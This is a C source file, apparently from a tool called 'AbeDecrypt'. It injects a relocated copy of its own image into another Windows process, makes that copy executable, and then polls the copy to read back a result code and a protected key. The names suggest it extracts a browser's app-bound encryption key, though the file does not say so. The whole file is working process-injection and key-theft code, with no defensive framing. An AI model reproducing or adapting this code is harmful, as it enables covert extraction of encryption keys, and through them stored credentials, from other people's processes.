#include "AbeDecrypt.h"

/* the payload writes its result into the .abedata section, so the remote copy
   must keep it writable while the rest of the image becomes RX */
#define ABE_PAYLOAD_SECTION ".abedata"

/* maps a relocated copy of our image into the target process; the copy is
   RX except the payload data section (RW), then flushed */
_Success_(NT_SUCCESS(return))
NTSTATUS
AbeMapSelf(
    _In_ HANDLE Process,
    _Out_ PVOID* Mapped)
{
    PIMAGE_NT_HEADERS Nt;
    PIMAGE_SECTION_HEADER Section;
    PBYTE Self = (PBYTE)&__ImageBase;
    PVOID Copy = NULL;
    PVOID Remote = NULL;
    PVOID ProtectBase;
    SIZE_T Size, RegionSize, ProtectSize;
    LONG64 Delta;
    ULONG i, OldProtect;
    NTSTATUS Status;

    Nt = NtGetImageNtHeader();
    Size = Nt->OptionalHeader.SizeOfImage;
    RegionSize = Size;
    *Mapped = NULL;
    Status = NtAllocateVirtualMemory(NtCurrentProcess(),
                                     &Copy,
                                     0,
                                     &RegionSize,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    if (!NT_SUCCESS(Status))
    {
        goto Cleanup;
    }
    Status = NtAllocateVirtualMemory(Process,
                                     &Remote,
                                     0,
                                     &RegionSize,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    if (!NT_SUCCESS(Status))
    {
        goto Cleanup;
    }

    RtlCopyMemory(Copy, Self, Size);
    Delta = (LONG64)((ULONG64)(ULONG_PTR)Remote - (ULONG64)(ULONG_PTR)Self);
    Status = PE_RelocateImage(Copy, Delta);
    if (!NT_SUCCESS(Status))
    {
        goto Cleanup;
    }
    Status = NtWriteVirtualMemory(Process, Remote, Copy, Size, NULL);
    if (!NT_SUCCESS(Status))
    {
        goto Cleanup;
    }

    /* executable memory must be read-only for execution: RX everywhere, then
       re-open just the payload data section for writing */
    ProtectBase = Remote;
    ProtectSize = RegionSize;
    Status = NtProtectVirtualMemory(Process,
                                    &ProtectBase,
                                    &ProtectSize,
                                    PAGE_EXECUTE_READ,
                                    &OldProtect);
    if (!NT_SUCCESS(Status))
    {
        goto Cleanup;
    }
    Section = IMAGE_FIRST_SECTION(Nt);
    for (i = 0; i < Nt->FileHeader.NumberOfSections; i++)
    {
        if (RtlEqualMemory(Section[i].Name, ABE_PAYLOAD_SECTION, sizeof(Section[i].Name)))
        {
            ProtectBase = (PBYTE)Remote + Section[i].VirtualAddress;
            ProtectSize = (SIZE_T)ALIGN_UP_BY(Section[i].Misc.VirtualSize, PAGE_SIZE);
            Status = NtProtectVirtualMemory(Process,
                                            &ProtectBase,
                                            &ProtectSize,
                                            PAGE_READWRITE,
                                            &OldProtect);
            if (!NT_SUCCESS(Status))
            {
                goto Cleanup;
            }
            break;
        }
    }
    Status = NtFlushInstructionCache(Process, Remote, Size);
    if (!NT_SUCCESS(Status))
    {
        goto Cleanup;
    }
    *Mapped = Remote;
    Status = STATUS_SUCCESS;

Cleanup:
    if (Copy != NULL)
    {
        RegionSize = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &Copy, &RegionSize, MEM_RELEASE);
    }
    if (!NT_SUCCESS(Status) && Remote != NULL)
    {
        RegionSize = 0;
        NtFreeVirtualMemory(Process, &Remote, &RegionSize, MEM_RELEASE);
    }
    return Status;
}

/* polls g_Pending in the mapped copy, then copies out g_Code/g_Key */
LONG
AbeWaitRemoteResult(
    _In_ HANDLE Process,
    _In_opt_ HANDLE WaitObject,
    _In_ PVOID Mapped,
    _In_ PVOID SelfBase,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    ULONG64 Delta = (ULONG64)(ULONG_PTR)Mapped - (ULONG64)(ULONG_PTR)SelfBase;
    PBYTE RemotePending = (PBYTE)((ULONG64)(ULONG_PTR)&g_Pending + Delta);
    PBYTE RemoteCode = (PBYTE)((ULONG64)(ULONG_PTR)&g_Code + Delta);
    PBYTE RemoteKey = (PBYTE)((ULONG64)(ULONG_PTR)g_Key + Delta);
    LONG Pending = 0, Code = (LONG)E_FAIL;
    LARGE_INTEGER Timeout;
    ULONG Polls;

    Timeout.QuadPart = -(LONGLONG)ABE_POLL_SLACK_MS * 10000;
    for (Polls = 0; Polls < ABE_POLL_COUNT; Polls++)
    {
        if (NT_SUCCESS(NtReadVirtualMemory(Process,
                                           RemotePending,
                                           &Pending,
                                           sizeof(Pending),
                                           NULL)) && Pending != 0)
        {
            break;
        }
        if (WaitObject != NULL &&
            NtWaitForSingleObject(WaitObject, FALSE, &Timeout) == STATUS_WAIT_0)
        {
            break;
        }
    }
    if (!NT_SUCCESS(NtReadVirtualMemory(Process,
                                        RemoteCode,
                                        &Code,
                                        sizeof(Code),
                                        NULL)))
    {
        return (LONG)E_FAIL;
    }
    if (Code == 0 &&
        !NT_SUCCESS(NtReadVirtualMemory(Process,
                                        RemoteKey,
                                        Key,
                                        ABE_KEY_SIZE,
                                        NULL)))
    {
        return (LONG)E_FAIL;
    }
    return Code;
}
